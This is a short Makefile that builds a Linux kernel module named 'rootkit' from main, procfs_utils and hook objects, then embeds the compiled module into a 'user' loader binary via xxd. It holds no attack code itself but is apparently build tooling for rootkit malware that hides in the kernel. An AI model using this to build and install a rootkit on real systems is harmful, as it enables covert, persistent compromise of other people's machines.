TARGET = rootkit
rootkit-objs = main.o procfs_utils.o hook.o
obj-m := $(TARGET).o

PWD := $(shell pwd)
KDIR := /lib/modules/$(shell uname -r)/build

all: module user

module:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

user: module
	xxd -i rootkit.ko > tmp.c
	cat user.c >> tmp.c
	gcc tmp.c -o user
	rm tmp.c
